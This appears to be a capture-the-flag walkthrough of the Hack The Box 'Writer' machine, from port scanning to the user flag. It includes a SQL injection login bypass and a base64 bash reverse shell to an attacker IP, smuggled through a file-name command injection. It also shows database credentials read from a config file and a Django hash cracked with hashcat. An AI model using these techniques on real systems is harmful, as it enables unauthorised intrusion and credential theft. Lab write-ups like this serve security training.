## Default Information
IP address : 10.10.11.101\
OS : Linux

## Enumeration
Firstly, let us enumerate all the open ports using ```Nmap```
* sV : service detection
* sC : Run default nmap scripts
* A : identify the OS behind each ports
* -p- : scan all ports

```bash
nmap -sC -sV -A -p- -T4 10.10.11.101 -vv
```

From the output of ```NMAP```, we are able to obtain the following information about the open TCP ports:
| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22	| SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | Open |
| 80	| http | Apache httpd 2.4.41 ((Ubuntu)) | Open |
| 139	| netbios-ssn | Samba smbd 4.6.2 | Open |
| 445	| netbios-ssn | Samba smbd 4.6.2 | Open |

Now, we will do a scan on the UDP ports to find any possible open UDP ports. Hoowever, there isn't much information for UDP ports that is worth exploring.
```
nmap -sU -Pn 10.10.11.101 -T4 -vv 
```

Before we continue furthur, we will add the IP address ```10.10.11.101``` to ```writer.htb``` in our ```/etc/hosts``` file. 

```
10.10.11.101    writer.htb
```

## Discovery
Firstly, We will now run ```gobuster``` on ```http://writer.htb``` to enumerate the directories on the endpoints. From the output, we discover an interesting ```/adminstrative``` endpoint.

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://writer.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://writer.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/09/11 13:46:22 Starting gobuster in directory enumeration mode
===============================================================
http://writer.htb/contact              (Status: 200) [Size: 4905]
http://writer.htb/about                (Status: 200) [Size: 3522]
http://writer.htb/static               (Status: 301) [Size: 309] [--> http://writer.htb/static/]
http://writer.htb/logout               (Status: 302) [Size: 208] [--> http://writer.htb/]       
http://writer.htb/dashboard            (Status: 302) [Size: 208] [--> http://writer.htb/]       
http://writer.htb/administrative       (Status: 200) [Size: 1443]                               
http://writer.htb/server-status        (Status: 403) [Size: 275]                                
                                                                                                
===============================================================
2021/09/11 14:06:47 Finished
===============================================================
```
 From the output, we realize that there is a ```/administrative``` endpoint that returns a status code of 200 and visiting this site brings us to an admin login page
 
 ![admin login page](https://github.com/joelczk/writeups/blob/main/HTB/Images/writer/admin_login.PNG)
 
 Looking at the login page, we realize that the admin login page is vulnerable to SQL injection attacks. Uisng ```admin'or 1=1 or ''='``` as the username, we realize that we are able to login to the webpage, and we will be redirected to the ```/dashboard``` endpoint
 
![dashboard endpoint](https://github.com/joelczk/writeups/blob/main/HTB/Images/writer/dashboard.PNG)
 
Looking through the website, we notice that there is a ```/dashboard/stories/<post id>``` endpoint that allows for file upload, but we can only upload JPEG files
![JPEG File Upload](https://github.com/joelczk/writeups/blob/main/HTB/Images/writer/file_upload.PNG)

Upon the upload of the file, we notice that the file will be saved in ```http://writer.htb/static/img/``` and the image will be updated at ```http://writer.htb/blog/post/<post id>```

Now, we will create a base64-encoded reverse shell payload. Afterwards, we have to create a JPEG image with the payload.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ echo -n '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.7/3000 0>&1"' | base64
L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNy8zMDAwIDA+
JjEi
                                                                                                 
┌──(kali㉿kali)-[~/Desktop]
└─$ touch '1.jpg; `echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNy8zMDAwIDA+JjEi| base64 -d | bash`;'
```

Afterwards, we will intercept the POST request during file upload to create the reverse shell.
![Modifying request using burp](https://github.com/joelczk/writeups/blob/main/HTB/Images/writer/file_burp.PNG)

## Obtaining user shell
Now, we would have obtained a reverse shell. We will first stabilize the shell
```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 3000             
listening on [any] 3000 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.101] 49678
bash: cannot set terminal process group (981): Inappropriate ioctl for device
bash: no job control in this shell
www-data@writer:/$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@writer:/$ export TERM=xterm
export TERM=xterm
www-data@writer:/$ stty cols 132 rows 34
stty cols 132 rows 34
www-data@writer:/$ 
```

Now we also realize that there are 2 users -- ```john``` and ```kyle``` on this terminal

```
www-data@writer:/$ cd home
cd home
www-data@writer:/home$ ls
ls
john  kyle
www-data@writer:/home$ 
```

Navigating to ```/etc/mysql``` we are able to find a ```mariadb.cnf``` that contains credentials to the mysql database

```
www-data@writer:/home$ cd /etc/mysql
cd /etc/mysql
www-data@writer:/etc/mysql$ ls
ls
conf.d  debian-start  debian.cnf  mariadb.cnf  mariadb.conf.d  my.cnf  my.cnf.fallback
www-data@writer:/etc/mysql$ cat mariadb.cnf
cat mariadb.cnf
# The MariaDB configuration file
#
# The MariaDB/MySQL tools read configuration files in the following order:
# 1. "/etc/mysql/mariadb.cnf" (this file) to set global defaults,
# 2. "/etc/mysql/conf.d/*.cnf" to set global options.
# 3. "/etc/mysql/mariadb.conf.d/*.cnf" to set MariaDB-only options.
# 4. "~/.my.cnf" to set user-specific options.
#
# If the same option is defined multiple times, the last one will apply.
#
# One can use all long options that the program supports.
# Run program with --help to get a list of available options and with
# --print-defaults to see which it would actually understand and use.

#
# This group is read both both by the client and the server
# use it for options that affect everything
#
[client-server]

# Import all .cnf files from configuration directory
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

[client]
database = dev
user = djangouser
password = DjangoSuperPassword
default-character-set = utf8
www-data@writer:/etc/mysql$ mysql -u djangouser -h localhost -p
mysql -u djangouser -h localhost -p
Enter password: DjangoSuperPassword

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A
```

Now, we will login to the mysql database and try to obtain the credentials to login to the ssh server. 
```
MariaDB [dev]> show tables;
show tables;
+----------------------------+
| Tables_in_dev              |
+----------------------------+
| auth_group                 |
| auth_group_permissions     |
| auth_permission            |
| auth_user                  |
| auth_user_groups           |
| auth_user_user_permissions |
| django_admin_log           |
| django_content_type        |
| django_migrations          |
| django_session             |
+----------------------------+
10 rows in set (0.000 sec)

MariaDB [dev]> select * from auth_user;
select * from auth_user;
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
| id | password                                                                                 | last_login | is_superuser | username | first_name | last_name | email           | is_staff | is_active | date_joined                |
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
|  1 | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= | NULL       |            1 | kyle     |            |           | kyle@writer.htb |        1 |         1 | 2021-05-19 12:41:37.168368 |
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
```

We will first try to identify the hash type and the hash is identified to possibly be Django hash using HashCat
```
┌──(kali㉿kali)-[~]
└─$ hashcat -h | grep "PBKDF2-SHA256"
   9200 | Cisco-IOS $8$ (PBKDF2-SHA256)                    | Operating System
  10000 | Django (PBKDF2-SHA256)                           | Framework
```
Afterwards, we will now we will use HashCat to decode the hash and obtain the password. The password is obtained to be ```marcoantonio```

```
┌──(kali㉿kali)-[~/Desktop]
└─$ hashcat -m 10000 hash.txt rockyou.txt  
┌──(kali㉿kali)-[~/Desktop]
└─$ hashcat -m 10000 hash.txt rockyou.txt --show                                             3 ⚙
pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio
```

Finally, we will now ssh into the user ```kyle``` and obtain the user flag.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh kyle@10.10.11.101                                                                    3 ⚙
The authenticity of host '10.10.11.101 (10.10.11.101)' can't be established.
ECDSA key fingerprint is SHA256:GX5VjVDTWG6hUw9+T11QNDaoU0z5z9ENmryyyroNIBI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.101' (ECDSA) to the list of known hosts.
kyle@10.10.11.101's password: 
Last login: Fri Sep 17 16:56:56 2021 from 10.10.14.15
kyle@writer:~$ ls
user.txt
kyle@writer:~$ cat user.txt
<Redacted user flag>
kyle@writer:~$ 
```
```
